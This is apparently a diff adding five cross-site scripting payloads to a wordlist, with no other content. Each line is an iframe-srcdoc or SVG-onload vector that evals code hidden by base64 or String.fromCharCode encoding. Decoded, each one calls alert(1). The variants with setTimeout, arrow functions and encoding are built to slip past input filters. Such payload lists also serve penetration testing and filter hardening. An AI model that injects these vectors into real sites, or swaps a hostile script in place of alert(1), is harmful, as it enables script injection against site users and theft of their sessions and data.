@@ -1,0 +1,5 @@
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<iframe srcdoc="<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)></svg>"></iframe>
+<svg onload='setTimeout(`eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,0)'></svg>
+<svg onload='setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>
+<svg onload='setTimeout(() => {eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>
